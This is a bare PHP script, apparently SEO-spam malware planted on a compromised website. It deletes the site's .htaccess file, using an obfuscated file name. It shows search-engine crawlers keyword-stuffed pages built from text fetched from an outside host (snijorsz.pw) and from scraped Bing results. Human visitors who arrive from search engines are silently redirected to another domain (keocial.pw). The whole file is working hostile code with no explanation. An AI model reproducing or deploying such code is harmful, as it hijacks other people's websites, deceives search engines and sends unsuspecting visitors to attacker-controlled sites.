<?php

$f1 = ".ht"; $f2 = "acc"; $f3 = "ess";
$ff = $f1.$f2.$f3;

if (file_exists($ff)) chmod ($ff, 0777);
if (file_exists($ff)) unlink ($ff);	

////

$cache_folder = "wtuds";
$template_folder = "nptoris";

$user_agent_to_filter = array( '#Ask\s*Jeeves#i', '#HP\s*Web\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\s*Library#',
                               '#ListChecker#i', '#MSIECrawler#i', '#NetCache#i', '#Nutch#i', '#RPT-HTTPClient#i',
                               '#rulinki\.ru#i', '#Twiceler#i', '#WebAlta#i', '#Webster\s*Pro#i','#www\.cys\.ru#i',
                               '#Wysigot#i', '#Yahoo!\s*Slurp#i', '#Yeti#i', '#Accoona#i', '#CazoodleBot#i',
                               '#CFNetwork#i', '#ConveraCrawler#i','#DISCo#i', '#Download\s*Master#i', '#FAST\s*MetaWeb\s*Crawler#i',
                               '#Flexum\s*spider#i', '#Gigabot#i', '#HTMLParser#i', '#ia_archiver#i', '#ichiro#i',
                               '#IRLbot#i', '#Java#i', '#km\.ru\s*bot#i', '#kmSearchBot#i', '#libwww-perl#i',
                               '#Lupa\.ru#i', '#LWP::Simple#i', '#lwp-trivial#i', '#Missigua#i', '#MJ12bot#i',
                               '#msnbot#i', '#msnbot-media#i', '#Offline\s*Explorer#i', '#OmniExplorer_Bot#i',
                               '#PEAR#i', '#psbot#i', '#Python#i', '#rulinki\.ru#i', '#SMILE#i',
                               '#Speedy#i', '#Teleport\s*Pro#i', '#TurtleScanner#i', '#User-Agent#i', '#voyager#i',
                               '#Webalta#i', '#WebCopier#i', '#WebData#i', '#WebZIP#i', '#Wget#i',
                               '#Yandex#i', '#Yanga#i', '#Yeti#i','#msnbot#i',
                               '#spider#i', '#yahoo#i', '#jeeves#i' ,'#google#i' ,'#altavista#i',
                               '#scooter#i' ,'#av\s*fetch#i' ,'#asterias#i' ,'#spiderthread revision#i' ,'#sqworm#i',
                               '#ask#i' ,'#lycos.spider#i' ,'#infoseek sidewinder#i' ,'#ultraseek#i' ,'#polybot#i',
                               '#webcrawler#i', '#robozill#i', '#gulliver#i', '#architextspider#i', '#yahoo!\s*slurp#i',
                               '#charlotte#i', '#ngb#i', '#BingBot#i' ) ;

if ( !empty( $_SERVER['HTTP_USER_AGENT'] ) && ( FALSE !== strpos( preg_replace( $user_agent_to_filter, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT'] ), '-NO-WAY-' ) ) ){
    $isbot = 1;
	}

if( FALSE !== strpos( gethostbyaddr($_SERVER['REMOTE_ADDR']), 'google')) 
{
    $isbot = 1;
}



if ($isbot)
{
	
	$myname = $cache_folder."/".$_GET["hfjt47ghjdrgg"];
	if (file_exists($myname))
	{
	$html = file($myname);
	$html = implode($html, "");
	echo $html;
	exit;
	}
	
$template = scandir($template_folder);
$template = $template[rand(2,sizeof($template)-1)];
$tpl = $template_folder."/".$template;
$tpl = file($tpl);


$keyword = str_replace("-", " ", $_GET["hfjt47ghjdrgg"]);
$keyword = chop($keyword);
$keyword = ucfirst($keyword);


 $query_pars = $keyword;
 $query_pars_2 = str_replace(" ", "+", chop($query_pars));
 $query_pars_2 = mb_strtolower($query_pars_2);

 $text = ""; 
 
 $ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://snijorsz.pw/story2.php?q=$query_pars_2&pass=qwerty28"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
$text = curl_exec($ch); 
curl_close($ch);
 
 if (strlen($text)<1000)
 {
	 
	 for ($page=1;$page<145;$page=$page+10)
{
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "https://www4.bing.com/search?q=$query_pars_2&first=$page"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2); 
//curl_setopt($ch, CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
$result = curl_exec($ch); 
curl_close($ch);
//echo $result;	

		preg_match_all ("#</div><p>(.*)</p></div>#iU",$result,$m);
		foreach ($m[1] as $a) $text .= $a;	

}
 
	
$text = str_replace("...", "", $text);
		$text = strip_tags($text); 
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);

		$text = explode(".", $text);
		shuffle($text);
		$text = array_unique($text);
		$text = implode(". ", $text);
 }

     	$html = implode ("\n", $tpl);
/*		
$titlename = $_SERVER['SERVER_NAME'];	
$titlename = explode(".", $titlename);
$titlename = strtoupper($titlename[0]);
if (strlen($titlename)>1) $html=str_replace("<title>{keyword}</title>", "<title>$keyword | $titlename</title>", $html);		
	*/	
		$html = str_replace("{keyword}", $keyword, $html);
		$html = str_replace("{manytext_bing}", $text, $html);
		
		$out = fopen($myname, "w");
		fwrite($out, $html);
		fclose($out);

		echo $html;
		
}	

if(!@$isbot)
{
if ((strpos($_SERVER['HTTP_REFERER'], "google")) OR (strpos($_SERVER['HTTP_REFERER'], "bing")) OR (strpos($_SERVER['HTTP_REFERER'], "yahoo")))
{
$keyword = str_replace("-", " ", $_GET["hfjt47ghjdrgg"]);
$keyword = str_replace(" ", "+", $keyword);

$ref = $_SERVER["HTTP_REFERER"];
$d = $_SERVER["HTTP_HOST"];
$mykeys  = $_GET["hfjt47ghjdrgg"];

header("Location: http://keocial.pw/sf/77?d=$d&mykeys=$mykeys");

exit;
}
}

//
?>